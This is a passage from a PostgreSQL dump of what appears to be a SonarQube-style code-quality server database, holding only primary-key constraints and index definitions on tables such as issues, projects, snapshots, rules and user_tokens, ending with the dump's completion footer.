    ADD CONSTRAINT widget_properties_pkey PRIMARY KEY (id);


--
-- TOC entry 2417 (class 2606 OID 33085)
-- Name: widgets widgets_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY widgets
    ADD CONSTRAINT widgets_pkey PRIMARY KEY (id);


--
-- TOC entry 2398 (class 1259 OID 33437)
-- Name: GROUPS_USERS_UNIQUE; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX "GROUPS_USERS_UNIQUE" ON groups_users USING btree (group_id, user_id);


--
-- TOC entry 2409 (class 1259 OID 33063)
-- Name: active_dashboards_dashboardid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX active_dashboards_dashboardid ON active_dashboards USING btree (dashboard_id);


--
-- TOC entry 2412 (class 1259 OID 33062)
-- Name: active_dashboards_userid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX active_dashboards_userid ON active_dashboards USING btree (user_id);


--
-- TOC entry 2477 (class 1259 OID 33473)
-- Name: activities_log_key; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX activities_log_key ON activities USING btree (log_key);


--
-- TOC entry 2488 (class 1259 OID 33541)
-- Name: ce_activity_component_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ce_activity_component_uuid ON ce_activity USING btree (component_uuid);


--
-- TOC entry 2489 (class 1259 OID 33578)
-- Name: ce_activity_islast_status; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ce_activity_islast_status ON ce_activity USING btree (is_last, status);


--
-- TOC entry 2490 (class 1259 OID 33575)
-- Name: ce_activity_islastkey; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ce_activity_islastkey ON ce_activity USING btree (is_last_key);


--
-- TOC entry 2493 (class 1259 OID 33540)
-- Name: ce_activity_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX ce_activity_uuid ON ce_activity USING btree (uuid);


--
-- TOC entry 2494 (class 1259 OID 33576)
-- Name: ce_queue_component_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX ce_queue_component_uuid ON ce_queue USING btree (component_uuid);


--
-- TOC entry 2497 (class 1259 OID 33550)
-- Name: ce_queue_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX ce_queue_uuid ON ce_queue USING btree (uuid);


--
-- TOC entry 2427 (class 1259 OID 33168)
-- Name: duplications_index_hash; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX duplications_index_hash ON duplications_index USING btree (hash);


--
-- TOC entry 2430 (class 1259 OID 33167)
-- Name: duplications_index_sid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX duplications_index_sid ON duplications_index USING btree (snapshot_id);


--
-- TOC entry 2389 (class 1259 OID 33517)
-- Name: events_component_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX events_component_uuid ON events USING btree (component_uuid);


--
-- TOC entry 2392 (class 1259 OID 32923)
-- Name: events_snapshot_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX events_snapshot_id ON events USING btree (snapshot_id);


--
-- TOC entry 2482 (class 1259 OID 33509)
-- Name: file_sources_project_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX file_sources_project_uuid ON file_sources USING btree (project_uuid);


--
-- TOC entry 2483 (class 1259 OID 33510)
-- Name: file_sources_updated_at; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX file_sources_updated_at ON file_sources USING btree (updated_at);


--
-- TOC entry 2484 (class 1259 OID 33528)
-- Name: file_sources_uuid_type; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX file_sources_uuid_type ON file_sources USING btree (file_uuid, data_type);


--
-- TOC entry 2403 (class 1259 OID 32972)
-- Name: group_roles_resource; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX group_roles_resource ON group_roles USING btree (resource_id);


--
-- TOC entry 2399 (class 1259 OID 32962)
-- Name: index_groups_users_on_group_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX index_groups_users_on_group_id ON groups_users USING btree (group_id);


--
-- TOC entry 2400 (class 1259 OID 32961)
-- Name: index_groups_users_on_user_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX index_groups_users_on_user_id ON groups_users USING btree (user_id);


--
-- TOC entry 2456 (class 1259 OID 33341)
-- Name: issue_changes_issue_key; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issue_changes_issue_key ON issue_changes USING btree (issue_key);


--
-- TOC entry 2457 (class 1259 OID 33340)
-- Name: issue_changes_kee; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issue_changes_kee ON issue_changes USING btree (kee);


--
-- TOC entry 2465 (class 1259 OID 33460)
-- Name: issue_filter_favs_user; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issue_filter_favs_user ON issue_filter_favourites USING btree (user_login);


--
-- TOC entry 2460 (class 1259 OID 33366)
-- Name: issue_filters_name; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issue_filters_name ON issue_filters USING btree (name);


--
-- TOC entry 2446 (class 1259 OID 33459)
-- Name: issues_assignee; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issues_assignee ON issues USING btree (assignee);


--
-- TOC entry 2447 (class 1259 OID 33514)
-- Name: issues_component_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issues_component_uuid ON issues USING btree (component_uuid);


--
-- TOC entry 2448 (class 1259 OID 33516)
-- Name: issues_creation_date; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issues_creation_date ON issues USING btree (issue_creation_date);


--
-- TOC entry 2449 (class 1259 OID 33342)
-- Name: issues_kee; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX issues_kee ON issues USING btree (kee);


--
-- TOC entry 2452 (class 1259 OID 33515)
-- Name: issues_project_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issues_project_uuid ON issues USING btree (project_uuid);


--
-- TOC entry 2453 (class 1259 OID 33348)
-- Name: issues_resolution; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issues_resolution ON issues USING btree (resolution);


--
-- TOC entry 2454 (class 1259 OID 33345)
-- Name: issues_rule_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issues_rule_id ON issues USING btree (rule_id);


--
-- TOC entry 2455 (class 1259 OID 33511)
-- Name: issues_updated_at; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX issues_updated_at ON issues USING btree (updated_at);


--
-- TOC entry 2422 (class 1259 OID 33529)
-- Name: manual_measures_component_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX manual_measures_component_uuid ON manual_measures USING btree (component_uuid);


--
-- TOC entry 2445 (class 1259 OID 33281)
-- Name: measure_filter_favs_userid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX measure_filter_favs_userid ON measure_filter_favourites USING btree (user_id);


--
-- TOC entry 2440 (class 1259 OID 33272)
-- Name: measure_filters_name; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX measure_filters_name ON measure_filters USING btree (name);


--
-- TOC entry 2365 (class 1259 OID 33577)
-- Name: measures_person; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX measures_person ON project_measures USING btree (person_id);


--
-- TOC entry 2366 (class 1259 OID 32851)
-- Name: measures_sid_metric; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX measures_sid_metric ON project_measures USING btree (snapshot_id, metric_id);


--
-- TOC entry 2364 (class 1259 OID 32857)
-- Name: metrics_unique_name; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX metrics_unique_name ON metrics USING btree (name);


--
-- TOC entry 2347 (class 1259 OID 33530)
-- Name: projects_kee; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX projects_kee ON projects USING btree (kee);


--
-- TOC entry 2348 (class 1259 OID 33513)
-- Name: projects_module_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX projects_module_uuid ON projects USING btree (module_uuid);


--
-- TOC entry 2351 (class 1259 OID 33495)
-- Name: projects_project_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX projects_project_uuid ON projects USING btree (project_uuid);


--
-- TOC entry 2352 (class 1259 OID 33531)
-- Name: projects_qualifier; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX projects_qualifier ON projects USING btree (qualifier);


--
-- TOC entry 2353 (class 1259 OID 32850)
-- Name: projects_root_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX projects_root_id ON projects USING btree (root_id);


--
-- TOC entry 2354 (class 1259 OID 33494)
-- Name: projects_uuid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX projects_uuid ON projects USING btree (uuid);


--
-- TOC entry 2393 (class 1259 OID 32935)
-- Name: properties_key; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX properties_key ON properties USING btree (prop_key);


--
-- TOC entry 2433 (class 1259 OID 33186)
-- Name: resource_index_key; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX resource_index_key ON resource_index USING btree (kee);


--
-- TOC entry 2436 (class 1259 OID 33187)
-- Name: resource_index_rid; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX resource_index_rid ON resource_index USING btree (resource_id);


--
-- TOC entry 2374 (class 1259 OID 32852)
-- Name: rules_parameters_rule_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX rules_parameters_rule_id ON rules_parameters USING btree (rule_id);


--
-- TOC entry 2371 (class 1259 OID 33403)
-- Name: rules_repo_key; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX rules_repo_key ON rules USING btree (plugin_rule_key, plugin_name);


--
-- TOC entry 2355 (class 1259 OID 32853)
-- Name: snapshot_project_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX snapshot_project_id ON snapshots USING btree (project_id);


--
-- TOC entry 2356 (class 1259 OID 32854)
-- Name: snapshots_parent; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX snapshots_parent ON snapshots USING btree (parent_snapshot_id);


--
-- TOC entry 2359 (class 1259 OID 33574)
-- Name: snapshots_qualifier; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX snapshots_qualifier ON snapshots USING btree (qualifier);


--
-- TOC entry 2360 (class 1259 OID 32855)
-- Name: snapshots_root; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX snapshots_root ON snapshots USING btree (root_snapshot_id);


--
-- TOC entry 2361 (class 1259 OID 33352)
-- Name: snapshots_root_project_id; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX snapshots_root_project_id ON snapshots USING btree (root_project_id);


--
-- TOC entry 2439 (class 1259 OID 33458)
-- Name: uniq_author_logins; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX uniq_author_logins ON authors USING btree (login);


--
-- TOC entry 2404 (class 1259 OID 33482)
-- Name: uniq_group_roles; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX uniq_group_roles ON group_roles USING btree (group_id, resource_id, role);


--
-- TOC entry 2386 (class 1259 OID 33474)
-- Name: uniq_profile_rule_ids; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX uniq_profile_rule_ids ON active_rules USING btree (profile_id, rule_id);


--
-- TOC entry 2487 (class 1259 OID 33526)
-- Name: uniq_project_qprofiles; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX uniq_project_qprofiles ON project_qprofiles USING btree (project_uuid, profile_key);


--
-- TOC entry 2383 (class 1259 OID 33480)
-- Name: uniq_qprof_key; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX uniq_qprof_key ON rules_profiles USING btree (kee);


--
-- TOC entry 2474 (class 1259 OID 33449)
-- Name: uniq_quality_gates; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX uniq_quality_gates ON quality_gates USING btree (name);


--
-- TOC entry 2346 (class 1259 OID 32771)
-- Name: unique_schema_migrations; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX unique_schema_migrations ON schema_migrations USING btree (version);


--
-- TOC entry 2407 (class 1259 OID 32982)
-- Name: user_roles_resource; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX user_roles_resource ON user_roles USING btree (resource_id);


--
-- TOC entry 2408 (class 1259 OID 32981)
-- Name: user_roles_user; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX user_roles_user ON user_roles USING btree (user_id);


--
-- TOC entry 2498 (class 1259 OID 33573)
-- Name: user_tokens_login_name; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX user_tokens_login_name ON user_tokens USING btree (login, name);


--
-- TOC entry 2501 (class 1259 OID 33572)
-- Name: user_tokens_token_hash; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX user_tokens_token_hash ON user_tokens USING btree (token_hash);


--
-- TOC entry 2377 (class 1259 OID 33461)
-- Name: users_login; Type: INDEX; Schema: public; Owner: postgres
--

CREATE UNIQUE INDEX users_login ON users USING btree (login);


--
-- TOC entry 2380 (class 1259 OID 33512)
-- Name: users_updated_at; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX users_updated_at ON users USING btree (updated_at);


--
-- TOC entry 2421 (class 1259 OID 33099)
-- Name: widget_properties_widgets; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX widget_properties_widgets ON widget_properties USING btree (widget_id);


--
-- TOC entry 2415 (class 1259 OID 33086)
-- Name: widgets_dashboards; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX widgets_dashboards ON widgets USING btree (dashboard_id);


--
-- TOC entry 2418 (class 1259 OID 33087)
-- Name: widgets_widgetkey; Type: INDEX; Schema: public; Owner: postgres
--

CREATE INDEX widgets_widgetkey ON widgets USING btree (widget_key);


-- Completed on 2017-11-23 19:33:40 +03

--
-- PostgreSQL database dump complete
--
